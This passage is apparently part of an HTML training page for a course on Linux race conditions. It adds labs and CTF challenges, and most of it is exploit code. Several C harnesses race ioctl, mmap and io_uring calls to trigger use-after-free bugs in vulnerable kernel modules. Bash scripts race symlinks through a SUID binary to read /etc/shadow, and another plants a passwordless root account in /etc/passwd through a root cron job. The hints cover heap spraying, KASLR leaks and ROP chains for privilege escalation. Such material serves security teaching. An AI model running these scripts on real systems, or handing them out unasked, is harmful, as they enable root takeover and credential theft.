+#include &lt;pthread.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sched.h&gt;
+
+static int fd;
+volatile int go = 0;
+
+void pin(int cpu) {
+    cpu_set_t set;
+    CPU_ZERO(&amp;set);
+    CPU_SET(cpu, &amp;set);
+    sched_setaffinity(0, sizeof(set), &amp;set);
+}
+
+void *thread_free(void *arg) {
+    pin(0);
+    while (!go) ;  // spin until synchronized
+    ioctl(fd, IOCTL_FREE, 0);
+    return NULL;
+}
+
+void *thread_use(void *arg) {
+    pin(1);
+    while (!go) ;
+    ioctl(fd, IOCTL_USE, 0);  // if free wins the race → UAF
+    return NULL;
+}
+
+int main() {
+    fd = open("/dev/vuln", O_RDWR);
+    for (int attempt = 0; attempt &lt; 10000; attempt++) {
+        ioctl(fd, IOCTL_ALLOC, 0);  // fresh object
+        go = 0;
+        pthread_t t1, t2;
+        pthread_create(&amp;t1, NULL, thread_free, NULL);
+        pthread_create(&amp;t2, NULL, thread_use, NULL);
+        go = 1;  // start both threads simultaneously
+        pthread_join(t1, NULL);
+        pthread_join(t2, NULL);
+    }
+}</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: CPU Pinning for Timing Control</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Demonstrate how CPU pinning affects race condition reliability. Compare win rates with and without CPU affinity using a simple TOCTOU race in a kernel module.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Measure race success rate
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+#define ATTEMPTS 100000
+static int fd;
+static volatile int wins = 0;
+
+void pin_cpu(int cpu) {
+    cpu_set_t set;
+    CPU_ZERO(&amp;set);
+    CPU_SET(cpu, &amp;set);
+    sched_setaffinity(0, sizeof(set), &amp;set);
+}
+
+void *racer(void *arg) {
+    int use_pinning = *(int *)arg;
+    if (use_pinning) pin_cpu(1);
+
+    for (int i = 0; i &lt; ATTEMPTS; i++) {
+        // Race against main thread's ioctl
+        ioctl(fd, IOCTL_FLIP, 0);  // modify state
+    }
+    return NULL;
+}
+
+int main() {
+    fd = open("/dev/race_test", O_RDWR);
+
+    // Test WITHOUT pinning
+    int pin = 0;
+    pthread_t t;
+    pthread_create(&amp;t, NULL, racer, &amp;pin);
+    for (int i = 0; i &lt; ATTEMPTS; i++) {
+        int ret = ioctl(fd, IOCTL_CHECK_AND_USE, 0);
+        if (ret == RACE_WON) wins++;
+    }
+    pthread_join(t, NULL);
+    printf("Without pinning: %d/%d wins\n", wins, ATTEMPTS);
+
+    // Test WITH pinning
+    wins = 0;
+    pin = 1;
+    pin_cpu(0);  // main on CPU 0
+    pthread_create(&amp;t, NULL, racer, &amp;pin);
+    for (int i = 0; i &lt; ATTEMPTS; i++) {
+        int ret = ioctl(fd, IOCTL_CHECK_AND_USE, 0);
+        if (ret == RACE_WON) wins++;
+    }
+    pthread_join(t, NULL);
+    printf("With pinning: %d/%d wins\n", wins, ATTEMPTS);
+}</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Filesystem Symlink Race</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Exploit a SUID binary that opens a user-specified file after a permissions check. Race between the check and open by swapping the file with a symlink to <code>/etc/shadow</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash">#!/bin/bash
+# race_symlink.sh — exploit SUID binary with TOCTOU
+# The SUID binary does: access(path, R_OK) → sleep → open(path) → read
+# Race: swap path between access() and open()
+
+SAFE="/tmp/safe_file"
+echo "harmless data" &gt; "$SAFE"
+
+# Racer: rapidly swap between real file and symlink
+while true; do
+    ln -sf /etc/shadow "$SAFE" 2&gt;/dev/null
+    ln -sf /dev/null "$SAFE" 2&gt;/dev/null  # reset to pass access() check
+    touch "$SAFE" 2&gt;/dev/null
+done &amp;
+RACER_PID=$!
+
+# Trigger: call the SUID binary many times
+for i in $(seq 1 5000); do
+    result=$(./suid_reader "$SAFE" 2&gt;/dev/null)
+    if echo "$result" | grep -q "root:"; then
+        echo "[+] Race won on attempt $i!"
+        echo "$result"
+        break
+    fi
+done
+
+kill $RACER_PID 2&gt;/dev/null</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: mmap Race Condition</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a race between <code>mmap</code>/<code>munmap</code> and a kernel module that accesses a mapped region. The module reads a user-provided mmap'd buffer, but the mapping can be changed between validation and use.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Module validates that user buffer is mmap'd to its device,
+// then reads from it. Race: unmap and remap to a different region.
+
+// exploit_mmap_race.c
+#include &lt;pthread.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+static void *shared_addr;
+static int dev_fd;
+volatile int racing = 1;
+
+void *remapper(void *arg) {
+    while (racing) {
+        // Unmap the device mapping
+        munmap(shared_addr, 0x1000);
+        // Remap with our controlled data
+        shared_addr = mmap(shared_addr, 0x1000, PROT_READ | PROT_WRITE,
+            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+        // Fill with exploit payload
+        memset(shared_addr, 'A', 0x1000);
+        *(unsigned long *)shared_addr = gadget_addr;
+
+        // Restore device mapping for next check
+        munmap(shared_addr, 0x1000);
+        shared_addr = mmap(shared_addr, 0x1000, PROT_READ | PROT_WRITE,
+            MAP_SHARED | MAP_FIXED, dev_fd, 0);
+    }
+    return NULL;
+}
+
+int main() {
+    dev_fd = open("/dev/vuln_mmap", O_RDWR);
+    shared_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                       MAP_SHARED, dev_fd, 0);
+
+    pthread_t t;
+    pthread_create(&amp;t, NULL, remapper, NULL);
+
+    for (int i = 0; i &lt; 100000; i++)
+        ioctl(dev_fd, IOCTL_READ_BUF, shared_addr);
+
+    racing = 0;
+    pthread_join(t, NULL);
+}</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: io_uring Race Setup</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Set up an io_uring instance and demonstrate a race between submitting operations and modifying registered files. Observe the timing window where the kernel references a file descriptor that has been closed and replaced.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// io_uring race skeleton
+#include &lt;liburing.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+
+static struct io_uring ring;
+static int registered_fds[64];
+volatile int racing = 1;
+
+void *closer_thread(void *arg) {
+    while (racing) {
+        // Close and reopen registered file descriptors
+        // This races with in-flight io_uring operations
+        for (int i = 0; i &lt; 64; i++) {
+            close(registered_fds[i]);
+            registered_fds[i] = open("/dev/null", O_RDWR);
+        }
+        // Update registration
+        io_uring_register_files_update(&amp;ring, 0, registered_fds, 64);
+    }
+    return NULL;
+}
+
+int main() {
+    io_uring_queue_init(256, &amp;ring, 0);
+
+    // Register file descriptors
+    for (int i = 0; i &lt; 64; i++)
+        registered_fds[i] = open("/tmp/testfile", O_RDWR | O_CREAT, 0644);
+    io_uring_register_files(&amp;ring, registered_fds, 64);
+
+    pthread_t t;
+    pthread_create(&amp;t, NULL, closer_thread, NULL);
+
+    // Submit I/O operations that reference registered fds
+    char buf[4096];
+    while (racing) {
+        struct io_uring_sqe *sqe = io_uring_get_sqe(&amp;ring);
+        io_uring_prep_read(sqe, 0, buf, sizeof(buf), 0);
+        sqe-&gt;flags |= IOSQE_FIXED_FILE;  // use registered fd index
+        io_uring_submit(&amp;ring);
+
+        struct io_uring_cqe *cqe;
+        io_uring_wait_cqe(&amp;ring, &amp;cqe);
+        io_uring_cqe_seen(&amp;ring, cqe);
+    }
+
+    pthread_join(t, NULL);
+    io_uring_queue_exit(&amp;ring);
+}</code></pre>
+<pre><code class="language-bash"># Compile with liburing
+gcc -o io_uring_race io_uring_race.c -luring -lpthread
+
+# Check io_uring availability
+cat /proc/sys/kernel/io_uring_disabled</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Race Window Measurement</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Measure the actual time window of a race condition using <code>rdtsc</code> (CPU timestamp counter). Determine how many CPU cycles the race window is open and calculate the probability of winning.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Measure race window in CPU cycles
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+static inline uint64_t rdtsc(void) {
+    uint32_t lo, hi;
+    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
+    return ((uint64_t)hi &lt;&lt; 32) | lo;
+}
+
+static int fd;
+static volatile uint64_t window_start = 0, window_end = 0;
+
+// Thread that detects when the race window opens/closes
+void *prober(void *arg) {
+    while (1) {
+        // Poll the vulnerable state
+        int state = ioctl(fd, IOCTL_GET_STATE, 0);
+        if (state == STATE_VULNERABLE &amp;&amp; window_start == 0)
+            window_start = rdtsc();
+        else if (state == STATE_SAFE &amp;&amp; window_start != 0) {
+            window_end = rdtsc();
+            break;
+        }
+    }
+    return NULL;
+}
+
+int main() {
+    fd = open("/dev/race_test", O_RDWR);
+
+    pthread_t t;
+    pthread_create(&amp;t, NULL, prober, NULL);
+
+    // Trigger the vulnerable operation
+    ioctl(fd, IOCTL_VULN_OP, 0);
+
+    pthread_join(t, NULL);
+
+    uint64_t cycles = window_end - window_start;
+    double ns = cycles / 3.0;  // ~3 GHz CPU → 1 cycle ≈ 0.33ns
+    printf("Race window: %lu cycles (%.1f ns)\n", cycles, ns);
+    printf("At 3GHz: ~%.1f microseconds\n", ns / 1000.0);
+
+    // Estimate win probability based on racer speed
+    // If racer iteration takes ~100 cycles and window is ~1000 cycles:
+    // P(win) ≈ window_cycles / racer_cycles ≈ 10%
+}</code></pre>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: TOCTOU File Race</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A SUID binary reads a user-specified file after checking permissions with <code>access()</code>. The flag is in <code>/flag</code> (root-only). Exploit the TOCTOU gap to read it.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># The binary does:
+#   access(argv[1], R_OK) → if ok → cat(argv[1])
+# Race: point to your file for access(), swap to /flag before cat()
+
+# Solution:
+echo "dummy" &gt; /tmp/myfile
+while true; do
+    ln -sf /flag /tmp/myfile
+    ln -sf /dev/null /tmp/myfile
+done &amp;
+
+for i in $(seq 1 10000); do
+    result=$(./suid_reader /tmp/myfile 2&gt;/dev/null)
+    if echo "$result" | grep -q "FLAG{"; then
+        echo "$result"
+        break
+    fi
+done</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The <code>access()</code> syscall checks permissions using the real UID, while <code>open()</code> uses the effective UID (root for SUID). Between the two calls, swap the symlink target. You need a tight loop because the window is small.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Userfaultfd-Assisted UAF</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A kernel module has a function that allocates an object, copies user data into it, then uses the object. Use userfaultfd to stall the copy and free the object before it's used.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Module's vulnerable function (pseudocode):
+// 1. obj = kmalloc(64)
+// 2. copy_from_user(obj-&gt;data, user_buf, 48)  ← stall here!
+// 3. obj-&gt;callback()  ← use after we freed and reclaimed
+
+// Exploit:
+// - Register user_buf with userfaultfd
+// - Call the ioctl → stalls at step 2
+// - In fault handler: free obj, reclaim with controlled data
+// - Provide page to resume → step 3 calls our function pointer
+
+// Key: the copy_from_user in step 2 will fault on our uffd page
+// giving us time to manipulate the heap between step 1 and step 3</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The trick is that <code>copy_from_user</code> at step 2 writes to <code>obj-&gt;data</code>, but your userfaultfd page fault occurs when the kernel <em>reads</em> from user_buf. While stalled, you can't free the specific obj being written to (the kernel holds a reference). Instead, use a different ioctl to free a <em>different</em> object, then spray to set up the heap. The vulnerability is in step 3 using a different, previously-freed object pointer.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Double Fetch Exploit</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A kernel module reads a user-supplied length field twice — once for validation, once for <code>copy_from_user</code>. Exploit the double fetch to overflow a 128-byte kernel stack buffer.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Race strategy:
+// Thread 1: repeatedly calls ioctl(fd, CMD, shared_struct)
+// Thread 2: flips shared_struct-&gt;length between 64 (safe) and 512 (overflow)
+
+// When fetch1 reads 64 (passes check) and fetch2 reads 512 (overflow):
+// copy_from_user copies 512 bytes into 128-byte buffer → stack overflow
+// Then proceed with standard kernel ROP
+
+// Timing: typically need 1000-100000 attempts
+// CPU pinning on separate cores helps</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use <code>mmap(MAP_SHARED)</code> for the shared struct so both threads see changes immediately. Pin each thread to a different CPU for true parallelism. The flip thread should use a tight loop without any syscalls (just memory stores) for maximum speed. Once the overflow triggers, it's a standard kernel stack overflow exploit.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Signal Handler Race</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A kernel module's ioctl handler performs a blocking operation. During the block, a pending signal causes the operation to restart via <code>-ERESTARTSYS</code>, but the module doesn't properly clean up state before restarting. Exploit this to corrupt a reference count.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Module pseudocode:
+// ioctl handler:
+//   refcount++
+//   wait_for_event()  ← can be interrupted by signal
+//   if (signal_pending) return -ERESTARTSYS;  // refcount not decremented!
+//   refcount--
+//   ...
+
+// Exploit: send signals during the wait to increment refcount
+// multiple times without corresponding decrements → refcount overflow
+// → can trick the module into freeing an in-use object (refcount = 0 after wrap)
+
+struct itimerval timer = {
+    .it_value = { .tv_sec = 0, .tv_usec = 10 },
+    .it_interval = { .tv_sec = 0, .tv_usec = 10 },
+};
+signal(SIGALRM, sighandler);
+setitimer(ITIMER_REAL, &amp;timer, NULL);
+
+// Rapid ioctl calls, each interrupted by signal → refcount keeps growing
+for (int i = 0; i &lt; 0x100000000UL; i++)
+    ioctl(fd, CMD, 0);  // returns -EINTR due to signal → refcount leak</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The goal is a 32-bit refcount overflow: increment it 2^32 times to wrap back to 0. At that point, a normal release path sees refcount=0 and frees the object while others still hold references → UAF. The signal must interrupt the blocking wait before the ioctl completes, so every call leaks one refcount increment.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Filesystem Symlink Race</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A cron job running as root writes logs to <code>/tmp/app.log</code>. It doesn't use <code>O_NOFOLLOW</code>. Exploit a symlink race to make it overwrite <code>/etc/passwd</code> with your controlled content.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># The cron job does (every minute):
+#   echo "$(date) - check ok" &gt;&gt; /tmp/app.log
+
+# Exploit: replace /tmp/app.log with symlink to /etc/passwd
+# Timing: cron runs at :00 seconds of each minute
+
+rm -f /tmp/app.log
+ln -s /etc/passwd /tmp/app.log
+
+# Wait for cron to fire → it appends to /etc/passwd via symlink
+# The appended line will corrupt the passwd format
+
+# Better approach: pre-set up a valid passwd line
+# First, create /tmp/app.log as normal file with our passwd entry
+echo 'hacker::0:0::/root:/bin/sh' &gt; /tmp/app.log
+# Then swap to symlink right before cron runs
+sleep 58  # wait until :58
+rm /tmp/app.log
+ln -s /etc/passwd /tmp/app.log
+# Cron appends "date - check ok" but our line is already injected
+su hacker  # login as root</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Check <code>fs.protected_symlinks</code>: if it's 1, symlinks in sticky directories (<code>/tmp</code>) won't be followed unless the symlink owner matches. In older or misconfigured systems this is 0. Alternative: use a non-sticky directory if the app uses one.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: SLUB Race Condition</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A kernel module has a race between its <code>release</code> (close) and <code>ioctl</code> handlers. Two threads can concurrently close the file descriptor and call ioctl, creating a UAF. Exploit it to escalate privileges.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Module: release() frees internal object, ioctl() uses it
+// No mutex between the two → race if called concurrently
+
+// Exploit approach:
+// 1. Open the device → allocates object
+// 2. dup() the fd → two fds reference same file/object
+// 3. Thread A: close(fd1) → triggers release → frees object
+// 4. Thread B: ioctl(fd2, USE, ...) → uses freed object
+
+int fd = open("/dev/vuln", O_RDWR);
+int fd2 = dup(fd);  // both reference same struct file
+
+// Race threads on separate CPUs
+// After UAF: reclaim with controlled data (msg_msg, setxattr)
+// then the ioctl uses our controlled data</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><code>dup()</code> creates a second fd referencing the same <code>struct file</code>. Closing one fd while the other is mid-ioctl creates the race. The <code>release</code> handler is only called when all references to the file are gone, but some modules incorrectly free internal state in the <code>release</code> of any fd. Spray with <code>setxattr</code> for flexible-size reclaim.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: Combined Race + Overflow</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A kernel module has a size check that can be bypassed via a double-fetch race, leading to a heap overflow. The overflow alone isn't enough — you need to race it into a specific heap layout. Use userfaultfd to stabilize both the race and the heap spray.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Multi-technique combo:
+// 1. userfaultfd to stall at first copy_from_user → set up heap layout
+// 2. Double-fetch race to bypass size check
+// 3. Heap overflow into adjacent msg_msg → OOB read for leak
+// 4. Second overflow → corrupt tty_struct ops → code execution
+
+// This represents real-world kernel exploit complexity where
+// multiple techniques are chained together
+
+// Phase 1: Leak via race + overflow + msg_msg OOB
+// Phase 2: Use leak to build ROP chain
+// Phase 3: Trigger overflow again with ROP payload</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Break it into phases. Phase 1: use the double-fetch to get a controlled overflow size, corrupt adjacent <code>msg_msg.m_ts</code>, and <code>msgrcv</code> to leak kernel pointers. Phase 2: calculate KASLR base and gadget addresses from the leak. Phase 3: trigger the overflow again, this time corrupting a function pointer (e.g., <code>tty_struct.ops</code>) to start a ROP chain.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Race to Modify Cred</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A kernel module copies the current task's cred struct, modifies it, and commits it — but the copy and commit aren't atomic. Race between two threads to get a partially-modified cred with UID=0.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Module pseudocode:
+// 1. new_cred = prepare_creds()     // copies current creds
+// 2. new_cred-&gt;cap_effective = ...  // grants a capability
+// 3. schedule()                     // ← RACE WINDOW (voluntary preemption)
+// 4. new_cred-&gt;euid = original_uid // supposed to restore UID
+// 5. commit_creds(new_cred)
+
+// If we can race between step 2 and step 4, and somehow make
+// step 4 use UID 0 instead of original_uid → escalation
+
+// Attack: use another vulnerability to corrupt the cred between
+// prepare_creds and commit_creds during the schedule() window
+// Or: trigger an exception in step 4 that skips the UID restore</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The <code>schedule()</code> call at step 3 gives other threads CPU time. If the module reads <code>original_uid</code> from a user-controlled variable (or the old cred is freed/modified during the window), you can influence what UID gets set. Focus on what happens to the old cred or the variable holding the UID during the preemption window.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: io_uring Race</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A kernel with io_uring enabled. Exploit a race between <code>IORING_OP_CLOSE</code> and <code>IORING_OP_READ</code> on the same fixed file descriptor. The close completes, but the read still references the freed file — achieve a file structure UAF.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Submit CLOSE and READ SQEs in rapid succession
+// on the same registered file index
+
+struct io_uring ring;
+io_uring_queue_init(32, &amp;ring, 0);
+
+int fds[] = { open("/dev/vuln", O_RDWR) };
+io_uring_register_files(&amp;ring, fds, 1);
+
+// Submit close
+struct io_uring_sqe *sqe1 = io_uring_get_sqe(&amp;ring);
+io_uring_prep_close(sqe1, 0);
+sqe1-&gt;flags |= IOSQE_FIXED_FILE;
+
+// Submit read (same fd index — may race with close)
+struct io_uring_sqe *sqe2 = io_uring_get_sqe(&amp;ring);
+char buf[256];
+io_uring_prep_read(sqe2, 0, buf, sizeof(buf), 0);
+sqe2-&gt;flags |= IOSQE_FIXED_FILE;
+
+// Submit both — kernel worker threads may process concurrently
+io_uring_submit(&amp;ring);
+
+// If read executes after close → uses freed struct file → UAF</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>io_uring processes SQEs asynchronously using kernel worker threads. If CLOSE and READ hit different workers (or the same worker processes them out of order due to dependencies), the READ can dereference a freed <code>struct file</code>. Spray <code>struct file</code> objects (by opening many files) to reclaim the freed slot with a controlled file.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Multi-Threaded Kernel Race</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A kernel module manages a shared linked list without proper locking. Multiple threads can add, remove, and traverse nodes concurrently. Exploit the lack of synchronization to corrupt the list, achieve arbitrary read/write, and escalate privileges.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Module: linked list operations without locks
+// ADD: allocates node, links into list
+// REMOVE: unlinks node, frees it
+// TRAVERSE: walks list, calls node-&gt;callback()
+
+// Race: REMOVE while TRAVERSE is walking → use-after-free
+// Or: concurrent REMOVE of adjacent nodes → list corruption
+
+// Exploit approach:
+// 1. Add many nodes to populate the list
+// 2. Thread A: continuously traverse (calls callbacks)
+// 3. Thread B: remove a node → frees it
+// 4. Thread C: spray with controlled data to reclaim freed node
+// 5. When traverse hits the reclaimed node → calls our callback
+
+// List corruption variant:
+// Concurrent remove of nodes A→B→C
+// Thread 1 removes B (sets A→next = C)
+// Thread 2 removes B again (double-free!) before thread 1's write is visible
+
+// CPU pinning on 2+ cores is critical for reliable SMP races</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The list traversal reads <code>node-&gt;next</code> then uses <code>node-&gt;callback</code>. If the node is freed between these two operations, you get a UAF. To increase reliability: spray many nodes, pin the traverse thread to one CPU and the free thread to another. Use <code>msg_msg</code> spray to reclaim — <code>msg_msg</code> has a linked list header at the same offset as the module's list nodes, so the list traversal won't crash on the next pointer.</p>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+</body>
+</html>
